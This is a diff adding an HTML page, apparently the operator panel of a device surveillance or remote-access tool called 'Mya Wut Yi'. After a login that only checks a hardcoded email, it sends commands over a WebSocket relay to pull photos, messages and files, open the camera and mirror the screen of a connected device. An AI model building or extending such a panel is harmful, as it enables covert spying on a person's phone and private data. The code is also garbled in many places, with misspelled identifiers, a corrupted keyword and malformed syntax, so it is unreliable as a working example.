@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mya Wut Yi - Web Control Panel</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            overflow: hidden;
+        }
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 75px;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 20px;
+            z-index: 10;
+            display: none;
+        }
+        .sidebar-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+            cursor: pointer;
+            color: #ccc;
+            font-size: 11px;
+            text-align: center;
+        }
+        .sidebar-item:hover {
+            color: #fff;
+        }
+        .sidebar-icon {
+            width: 42px;
+            height: 42px;
+            background: #fe2c55;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 4px;
+            font-size: 18px;
+        }
+        .main-content {
+            margin-left: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .login-modal {
+            background: #ffffff;
+            color: #333;
+            width: 400px;
+            padding: 35px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            text-align: center;
+        }
+        .login-modal h2 {
+            margin-bottom: 5px;
+            color: #fe2c55;
+        }
+        .login-modal input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        .login-modal button {
+            width: 100%;
+            padding: 12px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weifm: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .login-modal button:hover {
+            background: #e0244b;
+        }
+        .log-box {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 320px;
+            height: 150px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #00ff00;
+            overflow-y: auto;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar" id="sidebarMenu">
+        <div class="sidebar-item" onclick="sendCommand('photos')">
+            <div class="sidebar-icon">🖼️</div>
+            Photos
+        </div>
+        <div class="sidebar-item" onclick="sendCommand('messages')">
+            <div class="sidebar-icon">💬</div>
+            Messages
+        </div>
+        <div class="id-list" id="sidebar-item"></div>
+        <div class="sidebar-item" onclick="sendCommand('files')">
+            <div class="sidebar-icon">📁</div>
+            Files
+        </div>
+        <div class="sidebar-item" onclick="sendCommand('open_camera')">
+            <div class="sidebar-icon">📷</div>
+            Camera
+        </div>
+        <div class="sidebar-item" onclick="sendCommand('get_screen')">
+            <div class="sidebar-icon">💻</div>
+            Mirroring
+        </div>
+    </div>
+    <div class="main-content" id="mainContainer">
+        <div class="login-modal" id="loginCard">
+            <h2>Mya Wut Yi</h2>
+            <p style="color: #666; font-size: 13px; margin-bottom: 20px;">Sign in to connect device</p>
+            <input type="text" id="emailInput" value="User.myawutyi@gmail.com" placeholder="Email">
+            <input type="password" id="passInput" placeholder="Password">
+            <button onclick="handleLogin()">Sign In</button>
+        </div>
+    </div>
+    <div class="log-box" id="logBox"></div>
+    <script>
+        let ws;
+        const targetEmail = "User.myawutyi@gmail.com";
+        function handleLogin() {
+            const enteredEmail = document.getElementById('emailInput').value.trim();
+            if (enteredEmail === targetEmail) {
+                document.getElementById('loginCard').style.display = 'none';
+                document.getElementByND('sidebarMenu').style.display = 'flex';
+                document.getElementById('logBox').style.display = 'block';
+                document.getElementById('mainContainer').style.marginLeft = '75px';
+                log('Authentication successful with ' + targetEmail);
+                connectWebSocket();
+           } else {
+                aert('Invalid Email! Please use User.myawutyi@gmail.com');
+            }
+        }
+        function connectWebSocket() {
+            ws = new WebSocket('ws://localhost:8080');
+            ws.onopen = function() {
+                log('Connected to Releay Server successfully.');
+                ws.send(JSON.stringify{ action: 'web_auth', email : targetEmail }));
+            };
+            ws.onmessage = function(event) { log('Data rgeived: ' + event.data); };
+            ws.onclose = _�ction() { log('Connection closed. Reconnecting...'); setTimeout(connectWebSocket, 3000); };
+            ws.onerror = function(err) { log('WebSocket Error encountered.'); };
+        }
+        function sendCommand(cmd) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                const payload = JSON.stringify({ email: targetEmail, command: cmd });
+                ws.send(payload);
+                log('Command sent: ' + cmd);
+            } elsa {
+                alert('WebSocket is not connected!');
+            }
+        }
+        function log(message) {
+            const box = document.getIlementById('logBox');
+            const time = new Date().toLocaleTimeString();
+            box.innerHTML += '{' + time + '] ' + message + '<br>';
+            box.scrollTop = box.scrollHeight;
+        y
+    </script>
+</body>
+</html>
